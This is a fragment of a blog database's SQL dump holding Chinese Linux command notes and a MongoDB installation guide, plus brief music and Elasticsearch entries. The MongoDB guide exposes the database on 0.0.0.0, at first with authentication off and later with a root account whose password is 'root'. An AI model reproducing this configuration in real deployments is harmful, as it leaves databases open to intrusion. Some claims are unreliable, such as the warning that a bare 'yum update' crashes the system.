id=\"5_696\"></a>5个占位符说明</h3>\n<table>\n<thead>\n<tr>\n<th>项目</th>\n<th>含义</th>\n<th>范围</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>第一个*</td>\n<td>一小时中的第几分钟</td>\n<td>0-59</td>\n</tr>\n<tr>\n<td>第二个*</td>\n<td>一天的第几小时</td>\n<td>0-23</td>\n</tr>\n<tr>\n<td>第三个*</td>\n<td>一月的第几天</td>\n<td>1-31</td>\n</tr>\n<tr>\n<td>第四个*</td>\n<td>一年的第几个月</td>\n<td>1-12</td>\n</tr>\n<tr>\n<td>第五个*</td>\n<td>一周的星期几</td>\n<td>0-7(0和7都代表周日)</td>\n</tr>\n</tbody>\n</table>\n<h2><a id=\"_706\"></a>磁盘查询指令</h2>\n<p><code>df- lh</code> : 查询系统整体磁盘使用的情况</p>\n<p><code>du-h /目录</code> : 查询指定目录的磁盘占用情况  默认为当前目录</p>\n<ul>\n<li>-s 指定目录占用大小总汇</li>\n<li>-h带计量单位</li>\n<li>-a含文件\n<ul>\n<li>–max-depth=1 子目录深度</li>\n</ul>\n</li>\n<li>-c 列出明细的同时,增加汇总值</li>\n</ul>\n<h3><a id=\"_718\"></a>统计目录下文件的个数</h3>\n<p><code>man wc </code> 查看wc命令的用法</p>\n<p><code>ls -l /home |grep &quot;^-&quot;| wc -l</code> 统计home目录下文件的个数</p>\n<h3><a id=\"_724\"></a>统计目录下目录的个数</h3>\n<p><code>ls -l /home |grep &quot;^d&quot;| wc -l</code> 统计home目录下目录的个数</p>\n<h3><a id=\"_728\"></a>统计目录下所有的文件个数(包括子文件)</h3>\n<p><code>ls -lR /home |grep &quot;^-&quot;| wc -l</code> 统计home目录下所有的文件个数</p>\n<h3><a id=\"_732\"></a>统计目录下所有的目录个数(包括子目录)</h3>\n<p><code>ls -lR /home |grep &quot;^d&quot;| wc -l</code> 统计home目录下所有的目录个数</p>\n<h2><a id=\"_736\"></a>网络命令</h2>\n<p><code>ip</code></p>\n<p><code>last</code> 查看目前和过去所有登陆过系统的用户的信息</p>\n<p><code>lastlog -u 用户id号</code> 查看具体用户登陆的详细信息</p>\n<p><code>traceroute 主机</code> 查看数据包到路径之间的路径</p>\n<p><code>netstat</code> 显示网络有关的信息</p>\n<ul>\n<li><code>-a</code> 显示所有选项 默认不显示LISTEN相关</li>\n<li><code>-t</code> TCP协议</li>\n<li><code>-u</code> UDP协议 UDP 是User Datagram Protocol的简称, 中文名是用户数据报协议</li>\n<li><code>-l</code>  监听</li>\n<li><code>-r</code> 路由</li>\n<li><code>-n</code> 显示IP和端口号</li>\n<li><code>-p</code> 显示建立相关链接的程序名</li>\n</ul>\n<p><code>netstat -ntlp</code> 查看本机监听的端口及应用名称</p>\n<p><code>netstat -tlun</code> 查看本机监听的端口</p>\n<p><code>netstat -an</code> 查看本机所有的网路连接</p>\n<p><code>netstat -rn</code> 查看本机路由表</p>\n<p><code>setup</code> 配置网络</p>\n<p><code>mount</code> 挂载命令</p>\n<p><code>tcpdump -nn -i eth0 port 80  </code> 对网络上的数据包进行截获的包分析工具</p>\n<p><code>route -n</code> 显示和查看路由表  <code>-n</code>表示不解析名字</p>\n<p><code>arp -n</code> 显示和修改ARP</p>\n<p><code>dig</code></p>\n<p><code>curl www.baidu.com -I</code> 查看http的头部信息</p>\n<h2><a id=\"_778\"></a>进程管理</h2>\n<p>在linux中 服务命令中带有d(daemon)表示后台进程 &gt;&gt; mysqld</p>\n<p>ps命令是用来查看目录中,有哪些正在执行,以及他们执行的状况,可以不加任何参数</p>\n<p><code>ps -a</code> : 显示当前终端所有进程信息</p>\n<p><code>ps -u</code>: 以用户的格式显示进程</p>\n<p><code>ps -x</code>: 显示后台进程运行的参数</p>\n<p><img src=\"https://cdn.qingweico.cn/blog/5ef2e89114195aa594bfed39.png\" alt=\"1588383393872\" /></p>\n<ul>\n<li>user:用户名</li>\n<li>PID:进程的id</li>\n<li>%CPU:进程占用CPU的百分比</li>\n<li>%MEN:进程占用物理内存的百分比</li>\n<li>VSZ:进程占用虚拟内存的大小(KB)</li>\n<li>RSS:进程占用的物理内存大小(KB)</li>\n<li>TTY:终端名称缩写</li>\n<li>STAT:进程状态。S表示休眠  s表示该进程是会话的先到程序  N表示进程拥有比普通进程优先级更低的优先级   R表示正在运行 D表示短期等待 Z 表示僵死进程 T表示被跟踪或被停止</li>\n<li>START:进程的启动时间</li>\n<li>TIME:进程使用CPU的总时间</li>\n<li>COMMAND:启动进程所用的命令和参数,如果过长会被截断显示</li>\n</ul>\n<h3><a id=\"_804\"></a>查看单个进程</h3>\n<p><code>ps -aux | grep 单个进程的名称</code></p>\n<p><code>ps -aux | grep 单个进程的名称| grep -v grep</code>: 过滤掉grep操作</p>\n<h3><a id=\"_810\"></a>查看父进程</h3>\n<p><code>ps -ef</code>: 以全格式显示当前所有的进程,查看进程的父进程 <code>-e</code>:显示所有进程 <code>-f</code> :全格式</p>\n<p><img src=\"https://cdn.qingweico.cn/blog/5ef2e89114195aa594bfed3b.png\" alt=\"1588384476648\" /></p>\n<ul>\n<li>UID: 用户ID</li>\n<li>PID: 进程ID</li>\n<li>PPID: 父进程ID</li>\n<li>C: CPU用于计算执行优先级的因子。数值越大,表明进程是CPU密集型运算,执行优先级会降低,数值越小,表明进程是I/O密集型运算,执行优先级会提高</li>\n</ul>\n<h3><a id=\"_821\"></a>终止进程</h3>\n<p><code>kill 进程号</code></p>\n<p>强制非法用户下线</p>\n<p><img src=\"https://cdn.qingweico.cn/blog/5ef2e89114195aa594bfed3d.png\" alt=\"1588386912261\" /></p>\n<p><em><img src=\"https://cdn.qingweico.cn/blog/5ef2e89f14195aa594bff219.png\" alt=\"1588387069698\" /></em></p>\n<p><code>killall 进程名称</code> :            通过名称终止多个进程</p>\n<p><code>kill -9 进程号</code>   :             强制终止某个进程</p>\n<h3><a id=\"_835\"></a>查看进程树</h3>\n<p><code>pstree 【选项】</code></p>\n<p>【选项】  <code>-p</code>   显示进程的PID    <code>-u  </code> 显示进程的所属用户名</p>\n<h3><a id=\"strace_841\"></a>strace命令</h3>\n<h2><a id=\"_843\"></a>服务管理</h2>\n<p><code>systemctl status firewalld</code>  查看当前防火墙的状态(重启restart,终止stop,开始,start)</p>\n<h3><a id=\"_847\"></a>查看服务名</h3>\n<p><code>setup</code>  或者  <code>systemctl  list-unit-files</code></p>\n<h3><a id=\"_851\"></a>动态监控服务</h3>\n<p><code>top -u 用户名</code>: 监视特定用户</p>\n<p><img src=\"https://cdn.qingweico.cn/blog/5ef2e89f14195aa594bff21b.png\" alt=\"1588392949656\" /></p>\n<p><code>top 回车 k 回车 进程号 </code>: 选择要终止的进程</p>\n<p><strong>设定动态刷新的时间(默认是3秒)</strong></p>\n<p><code>top -d 时间间隔(s)</code></p>\n<p><strong>字母q可以退出动态监控界面</strong></p>\n<h3><a id=\"_865\"></a>监控网络状态</h3>\n<p><code>netstat -anp</code> 查看系统所有的网络服务 <code>-an</code>:按一定顺序排列输出 <code>-p</code> :显示哪个进程在调用  <code>-t </code> :显示TCP传输协议的连线状况</p>\n<p><code>netstat -anp | grep 网络服务名称</code> 查看单个网络服务</p>\n<h2><a id=\"rpm_871\"></a>rpm</h2>\n<p>安装未安装的rpm包时,使用rpm包全名且后跟rpm包的路径,而查询或者卸载时直接使用包名,系统会从数据库中寻找该rpm包的信息,所以可以在任意位置查询或卸载该rpm包</p>\n<p><em><img src=\"https://cdn.qingweico.cn/blog/5ef2e8a614195aa594bff3e6.png\" alt=\"1589100480404\" /></em></p>\n<pre><div class=\"hljs\"><code class=\"lang-bash\">rpm -qa | grep 包名;  <span class=\"hljs-comment\"># 查询rpm安装包</span>\nrpm -e --nodeps 包名 ;<span class=\"hljs-comment\"># 强行卸载rpm安装包  erase</span>\nrpm -ivh rmp包全名;   <span class=\"hljs-comment\"># 安装rpm文件</span>\n</code></div></pre>\n<p><code>-i</code> 代表安装(install)</p>\n<p><code>-v</code> 代表显示详细信息 verbose</p>\n<p><code>-h </code> 显示详细信息 hash</p>\n<p><code>--nodeps</code> 不检测依赖性</p>\n<p><code>rpm -ql</code> 查询rpm包的安装位置   <code>l</code> list    <code>q</code>  query   <code>p</code>  package查询未安装包将要安装的信息(加全包名)</p>\n<p><code>rpm -qf 系统文件</code> 查询系统文件属于那个rpm包</p>\n<p><code>rpm -qR 包名</code> 查询已安装包的依赖</p>\n<p><code>rpm -qRp 包全名</code> 查询未安装包的依赖 R requires</p>\n<h2><a id=\"yum_899\"></a>yum</h2>\n<p><em><strong>yum只是在线管理rpm包的命令,并不存在yum包,可以解决包和包之间的依赖</strong></em></p>\n<p><code>yum list | grep 包名</code> 查看系统是否存在该rpm包</p>\n<p><code>yum install 包名</code> 安装rpm文件</p>\n<p><code>yum remove 包名 </code>    卸载rpm包</p>\n<p><code>yum update 包名</code>  升级rpm包 <em><strong>不加包名会升级所有的rpm包括linux内核,导致系统崩溃</strong></em></p>\n<p><code>-y 选项</code>  自动回答yes</p>\n<p><code>yum install -y man-pages</code> 安装函数使用手册</p>\n<p><code>yum install -y lsof</code></p>\n<p><code>yum install -y nc</code></p>\n<h2><a id=\"Shell_919\"></a>Shell</h2>\n<h3><a id=\"_921\"></a>脚本的执行方式</h3>\n<ul>\n<li>bash xx.sh</li>\n<li>sh xx.sh</li>\n<li>./sh</li>\n<li>bash -x xxx.sh 查看脚本的执行过程</li>\n</ul>\n<h3><a id=\"read_928\"></a>交互式定义变量(read)</h3>\n<p>read [options] variables</p>\n<ul>\n<li>-p 定义提示用户的信息</li>\n<li>-n 定于字符数</li>\n<li>-s 不显示用户输入的内容</li>\n<li>-t 定义超时时间</li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 从文件中读取一行数据复制给name</span>\n<span class=\"hljs-built_in\">read</span> name &lt; file\n</code></div></pre>\n<p>定义有类型的变量(declare)</p>\n<p>declare [options] variables=value</p>\n<p>unset variables: 取消赋值操作</p>\n<ul>\n<li>-i 将变量看成整数</li>\n<li>-r 定义只读变量</li>\n<li>-a 定义为普通数组</li>\n<li>-A 定义关联数组</li>\n<li>-x 将变量通过环境导出</li>\n</ul>\n<h3><a id=\"_954\"></a>变量的分类</h3>\n<h4><a id=\"_956\"></a>本地变量</h4>\n<p>当前用户自定义的变量。当前进程中进程有效(一个bash终端就是一个进程), 其他进程以及当前进程的子进程无效</p>\n<h4><a id=\"_960\"></a>环境变量</h4>\n<p>当前进程有效, 并且能够被子进程调用</p>\n<ul>\n<li>env 查看当前用户的环境变量</li>\n<li>set 查询当前用户的所有变量(临时变量和环境变量)</li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 导出环境变量</span>\n<span class=\"hljs-built_in\">export</span> A=123 -&gt; <span class=\"hljs-built_in\">declare</span> -x A=123\n<span class=\"hljs-comment\"># 查看环境变量</span>\n<span class=\"hljs-built_in\">env</span> | grep A\n</code></div></pre>\n<h4><a id=\"_974\"></a>全局变量</h4>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 当前用户的bash信息 用户登陆时读取</span>\n<span class=\"hljs-variable\">$HOME</span>/.bashrc\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 当前用户的环境变量, 用户登陆时读取</span>\n<span class=\"hljs-variable\">$HOME</span>/.bash_profile\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 当前用户退出当前shell时读取</span>\n<span class=\"hljs-variable\">$HOME</span>/.bash_logout\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 全局的bash信息, 所有的用户都生效</span>\n/etc/bashrc\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 全局环境变量信息</span>\n/etc/profile\n</code></div></pre>\n<p>用户登系统读取相关文件的顺序</p>\n<ul>\n<li><code>/etc/profile</code></li>\n<li><code>$HOME/.bash_profile</code></li>\n<li><code>$HOME/.bashrc</code></li>\n<li><code>/etc/bashrc</code></li>\n<li><code>$HOME/.bash_logout</code></li>\n</ul>\n<h4><a id=\"bash_1009\"></a>系统变量(内置bash变量)</h4>\n<table>\n<thead>\n<tr>\n<th>内置变量</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$?</td>\n<td>上一条命令执行返回后的状态; 状态值为0表示正常执行, 非0表示执行异常或者错误</td>\n</tr>\n<tr>\n<td>$0</td>\n<td>当前执行的程序或脚本名</td>\n</tr>\n<tr>\n<td>$#</td>\n<td>脚本后面接的参数个数</td>\n</tr>\n<tr>\n<td>$*</td>\n<td>脚本后面所有参数, 参数当成一个整体输出, 每一个变量变量之间以空格隔开</td>\n</tr>\n<tr>\n<td>$@</td>\n<td>脚本后面所有的参数, 参数是独立的, 也是全部输出</td>\n</tr>\n<tr>\n<td>$1-$9</td>\n<td>脚本后面的参数位置 $1表示第一个位置参数</td>\n</tr>\n<tr>\n<td>${10} - ${n}</td>\n<td>扩展位置参数 {2个数字以上括起来}</td>\n</tr>\n<tr>\n<td>$$</td>\n<td>当前所在进程的进程号</td>\n</tr>\n<tr>\n<td>$!</td>\n<td>后台运行的最后一个进程号</td>\n</tr>\n<tr>\n<td>!$</td>\n<td>调用最后一条命令历史中的参数</td>\n</tr>\n</tbody>\n</table>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;\\$0 = <span class=\"hljs-variable\">$0</span>&quot;</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;\\$# = <span class=\"hljs-variable\">$#</span>&quot;</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;\\$* = $*&quot;</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;\\$@ = <span class=\"hljs-variable\">$@</span>&quot;</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;\\$1 = <span class=\"hljs-variable\">$1</span>&quot;</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;\\$2 = <span class=\"hljs-variable\">$2</span>&quot;</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;\\$3 = <span class=\"hljs-variable\">$3</span>&quot;</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;\\$10 = <span class=\"hljs-variable\">${10}</span>&quot;</span>\n</code></div></pre>\n<pre><code class=\"lang-\">./test.sh a b c d e f g h i j\n</code></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-variable\">$0</span> = ./test.sh\n<span class=\"hljs-variable\">$#</span> = 10\n$* = a b c d e f g h i j\n<span class=\"hljs-variable\">$@</span> = a b c d e f g h i j\n<span class=\"hljs-variable\">$1</span> = a\n<span class=\"hljs-variable\">$2</span> = b\n<span class=\"hljs-variable\">$3</span> = c\n<span class=\"hljs-variable\">$10</span> = j\n</code></div></pre>\n<h3><a id=\"_1050\"></a>四则运算</h3>\n<ul>\n<li>$(()) echo $((1+1))</li>\n<li>$[]    echo $[3+2]</li>\n<li>expr expr 10 * 5 (需要将*转义, 且操作数和*号之间一定要有空格)</li>\n<li>let     n=1; let n+=1(不可以有空格)</li>\n<li>2**2 次方运算 (expr不支持)</li>\n<li>bc</li>\n</ul>\n<h3><a id=\"_1059\"></a>条件判断</h3>\n<ul>\n<li>test 条件表达式</li>\n<li>[ 条件表达式 ]</li>\n<li>[[ 条件表达式 ]] : 支持正则 (注:两边中括号和表达式之间都有空格</li>\n</ul>\n<h4><a id=\"_1065\"></a>判断文件类型</h4>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">判断参数</th>\n<th style=\"text-align:center\">含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">-e</td>\n<td style=\"text-align:center\">判断文件是否存在(任何类型文件)</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-f</td>\n<td style=\"text-align:center\">判段文件是否存在并且是一个普通文件</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-d</td>\n<td style=\"text-align:center\">判断文件是否存在并且是一个目录</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-L</td>\n<td style=\"text-align:center\">判断文件是否存在并且是一个软链接文件</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-b</td>\n<td style=\"text-align:center\">判断文件是否存在并且是一个块设备文件</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-S</td>\n<td style=\"text-align:center\">判断文件是否存在并且是一个套接字文件</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-c</td>\n<td style=\"text-align:center\">判断文件是否存在并且是一个字符文件</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-p</td>\n<td style=\"text-align:center\">判断文件是否存在并且是一个命名管道文件</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-s</td>\n<td style=\"text-align:center\">判断文件是否存在并且是一个非空文件</td>\n</tr>\n</tbody>\n</table>\n<h4><a id=\"_1079\"></a>判断文件权限</h4>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">判断参数</th>\n<th style=\"text-align:center\">含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">-r</td>\n<td style=\"text-align:center\">当前用户对其是否可读</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-w</td>\n<td style=\"text-align:center\">当前用户对其是否可写</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-x</td>\n<td style=\"text-align:center\">当前用户对其是否可读</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-u</td>\n<td style=\"text-align:center\">是否有suid 高级权限冒险位</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-g</td>\n<td style=\"text-align:center\">受否有sgid 高级权限强制位</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-k</td>\n<td style=\"text-align:center\">当是否育t位 高级权限强制位</td>\n</tr>\n</tbody>\n</table>\n<h4><a id=\"_1090\"></a>判断整数</h4>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">判断参数</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">-eq</td>\n<td>相等</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-ne</td>\n<td>不等</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-gt</td>\n<td>大于</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-lt</td>\n<td>小于</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-ge</td>\n<td>大于等于</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-le</td>\n<td>小于等于</td>\n</tr>\n</tbody>\n</table>\n<h4><a id=\"_1101\"></a>判断字符串</h4>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">判断参数</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">-z</td>\n<td>判断是否为空字符串(长度为0即为空)</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">-n</td>\n<td>判断是否为非空字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">=</td>\n<td>判断字符串是否相等</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">!=</td>\n<td>判断字符串是否不相等</td>\n</tr>\n</tbody>\n</table>\n<h4><a id=\"_1110\"></a>多重条件判断符</h4>\n<table>\n<thead>\n<tr>\n<th>判断符号</th>\n<th>含义</th>\n<th>举例</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-a(all) 和 &amp;&amp;</td>\n<td>逻辑与</td>\n<td>[ $(id -u) -eq 0 ] &amp;&amp; echo “admin”          [ 0 -lt 1 -a 1 -lt 0 ]; echo $?</td>\n</tr>\n<tr>\n<td>-o(or) 和 ||</td>\n<td>逻辑或</td>\n<td>[ 0 -lt 1 -o 1 -lt 0 ]; echo $?</td>\n</tr>\n</tbody>\n</table>\n<p>注: &amp;&amp; 前面的表达式为真时, 才会执行后面的代码</p>\n<p>|| 前面的表达式为假, 才会执行后面的代码</p>\n<p>; 用于分割命令或者表达式</p>\n<h4><a id=\"C_1123\"></a>条件判断(C风格)</h4>\n<p><code> (( 1 == 3)); echo $?</code></p>\n<p><code>[ &quot;hello&quot; = &quot;world&quot; ]; echo $? </code>  当使用[]时用加引号</p>\n<p><code>a=&quot;hello&quot;;b=&quot;world&quot;;[ &quot;$a&quot; = &quot;$b&quot; ]; echo $?</code></p>\n<p><code>[[ hello = hello ]]; echo $?</code> 使用[[]]时不用加引号</p>\n',5,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJb5yANwtHAAAkVW0mzkw69.jpeg',2,0,'220226DP09K1F0SW','Linux [TOC] UNIX发展史 1969年美国贝尔实验室的肯.汤姆森(KenThompson)在PDP-机器上开发出了UNIX系统 1971年DennisM.Ritchie(丹尼斯.里奇)发明了C语言与kenThompson一起开发UNIX系统 1973年UNIX大部分的源码用C语言重写,因此提高了UNIX系统的可移植性 Linux发展史 Linux系统诞生于1993年,由芬兰大学生李纳斯',0,0,0,NULL,0,123,'2021-12-09 09:58:11','2022-04-03 09:58:11','[\"220329D4B48S3TR4\",\"220329D180W7F2RP\"]',0),('220403CTCXKXNP4H','安装配置mongodb','<h1><a id=\"_0\"></a>目录</h1>\n<p>[TOC]</p>\n<h2><a id=\"mongodb_4\"></a>安装配置mongodb</h2>\n<p>centos7.x</p>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 下载</span>\nwget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel70-5.0.3-rc0.tgz /opt\n<span class=\"hljs-comment\"># 解压</span>\ntar -zxvf mongodb-linux-x86_64-rhel70-5.0.3-rc0.tgz -C  /usr/local\n<span class=\"hljs-comment\"># 重命名</span>\n<span class=\"hljs-built_in\">mv</span> mongodb-linux-x86_64-rhel70-5.0.3-rc0 mongodb\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 配置环境变量</span>\nvim /etc/profile\n<span class=\"hljs-comment\"># Set MongoDB Configuration</span>\n<span class=\"hljs-built_in\">export</span> PATH=/usr/local/mongodb/bin:<span class=\"hljs-variable\">$PATH</span>\n<span class=\"hljs-built_in\">source</span> /etc/profile\n<span class=\"hljs-comment\"># 查看MongoDB版本</span>\nmongo -verison\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-built_in\">cd</span> mongodb\n<span class=\"hljs-comment\"># 用于储存数据库文件数据</span>\n<span class=\"hljs-built_in\">mkdir</span> data/db -p\n<span class=\"hljs-built_in\">mkdir</span> data/logs\n<span class=\"hljs-comment\"># 用于储存日志w</span>\n<span class=\"hljs-built_in\">cd</span> data/logs\n<span class=\"hljs-built_in\">touch</span> mongodb.log\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 在mongodb根目下创建核心配置文件</span>\nvim mongodb.conf\n<span class=\"hljs-comment\"># ========================================</span>\n<span class=\"hljs-comment\"># 端口号</span>\nport=27017\n<span class=\"hljs-comment\"># 数据库文件位置</span>\ndbpath=/usr/local/mongodb/data/db\n<span class=\"hljs-comment\"># 日志文件位置</span>\nlogpath=/usr/local/mongodb/data/logs/mongodb.log\n\n<span class=\"hljs-comment\"># 以追加日志的形式记录</span>\nlogappend=<span class=\"hljs-literal\">true</span>\n<span class=\"hljs-comment\"># 滤掉无用日志信息,若需要调试使用请设置为false</span>\nquiet=<span class=\"hljs-literal\">true</span>\n<span class=\"hljs-comment\"># 以后台方式运行</span>\nfork=<span class=\"hljs-literal\">true</span>\n<span class=\"hljs-comment\"># 最大同时连接数</span>\nmaxConns=100\n<span class=\"hljs-comment\"># 不启用验证权限</span>\nnoauth=<span class=\"hljs-literal\">true</span>\n<span class=\"hljs-comment\"># 启用用户账号权限</span>\n<span class=\"hljs-comment\"># auth=true</span>\n<span class=\"hljs-comment\"># 开启日志,默认true</span>\njournal=<span class=\"hljs-literal\">true</span>\n<span class=\"hljs-comment\"># 提供外网访问,不对ip进行绑定,原理同redis的bindip</span>\nbind_ip = 0.0.0.0\n<span class=\"hljs-comment\"># ========================================</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 启动mongodb</span>\nmongod -f mongodb.conf\n</code></div></pre>\n<h2><a id=\"mongodb_72\"></a>创建mongodb用户账号权限</h2>\n<p>修改配置文件mongodb.conf</p>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 不启用验证权限</span>\n<span class=\"hljs-comment\"># noauth=true</span>\n<span class=\"hljs-comment\"># 启用用户账号权限</span>\nauth=<span class=\"hljs-literal\">true</span>\n\n<span class=\"hljs-comment\">## 重启mongodb</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 进入mongo控制台</span>\nmongo\n<span class=\"hljs-comment\"># 切换到admin库</span>\nuse admin\n<span class=\"hljs-comment\"># 创建用户 账号和密码为root root 角色为root</span>\ndb.createUser({user: <span class=\"hljs-string\">&quot;root&quot;</span>, <span class=\"hljs-built_in\">pwd</span>: <span class=\"hljs-string\">&quot;root&quot;</span>, roles: [<span class=\"hljs-string\">&quot;root&quot;</span>]})\n</code></div></pre>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">角色名称</th>\n<th style=\"text-align:left\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">Read</td>\n<td style=\"text-align:left\">允许用户读取指定数据库</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">readWrite</td>\n<td style=\"text-align:left\">允许用户读写指定数据库</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">dbAdmin</td>\n<td style=\"text-align:left\">允许用户在指定数据库中执行管理函数,如索引创建、删除,查看统计或访问system.profile</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">userAdmin</td>\n<td style=\"text-align:left\">允许用户向system.users集合写入,可以找指定数据库里创建、删除和管理用户</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">clusterAdmin</td>\n<td style=\"text-align:left\">只在admin数据库中可用, 赋予用户所有分片和复制集相关函数的管理权限</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">readAnyDatabase</td>\n<td style=\"text-align:left\">只在admin数据库中可用, 赋予用户所有数据库的读权限</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">readWriteAnyDatabase</td>\n<td style=\"text-align:left\">只在admin数据库中可用, 赋予用户所有数据库的读写权限</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">userAdminAnyDatabase</td>\n<td style=\"text-align:left\">只在admin数据库中可用, 赋予用户所有数据库的userAdmin权限</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">dbAdminAnyDatabase</td>\n<td style=\"text-align:left\">只在admin数据库中可用, 赋予用户所有数据库的dbAdmin权限</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">root</td>\n<td style=\"text-align:left\">只在admin数据库中可用, 超级账号,超级权限</td>\n</tr>\n</tbody>\n</table>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 登陆</span>\ndb.auth(<span class=\"hljs-string\">&quot;root&quot;</span>, <span class=\"hljs-string\">&quot;root&quot;</span>)\n<span class=\"hljs-comment\"># 查看用户</span>\nshow <span class=\"hljs-built_in\">users</span>\n</code></div></pre>\n',5,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJb9uAEblwAABWqyGLFBA13.jpeg',2,0,'220226DP09K1F0SW','目录 [TOC] 安装配置mongodb centos7.x #下载 wgethttps://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel70-5.0.3-rc0.tgz/opt #解压 tar-zxvfmongodb-linux-x86_64-rhel70-5.0.3-rc0.tgz-C/usr/local #重命名 mvmongodb-l',0,0,0,NULL,0,0,'2021-11-21 15:59:17','2022-04-03 09:59:17','[\"220329D4CRPCTPSW\",\"220329D4N9GNBDKP\",\"220329D180W7F2RP\"]',0),('220414DPDB6DTT2W','Astronomia (MaxRiven Mix)','<p>歌手：<a href=\"https://music.163.com/artist?id=12278745\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"background-color: rgb(245, 245, 245); color: rgb(12, 115, 194);\">MaxRiven</a></p><p><span class=\"ql-cursor\">﻿</span>所属专辑：</span><a href=\"https://music.163.com/album?id=88321150\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"background-color: rgb(245, 245, 245); color: rgb(12, 115, 194);\">Astronomia</a></p>',11,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJYAbeAOxoKAAGQwJ6Bxls196.JPG',2,0,'220226DP09K1F0SW','歌手：MaxRiven﻿所属专辑：Astronomia',0,0,0,NULL,0,0,'2022-01-08 11:14:24','2022-04-14 11:14:24','[\"220414DPDB6K7A14\",\"220414DPDBBTZ8BC\"]',0),('220424A4ABRTCTF8','ElasticSearch','<p><a href=\"https://www.elastic.co/cn/downloads/past-releases#elasticsearch\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: rgb(65, 131, 196);\">es下载列表</a></p><ul><li>修改es核心配置文件elasticsearch.yml</li><li>修改JVM参数(jvm.options)</li></ul><pre class=\"ql-syntax\" spellcheck=\"false\"># es不允许root用户操作\nuseradd esuser\nchown -R esuser:esuser /usr/local/elasticsearch-x.x.x\nsu esuser\nwhoami\n# 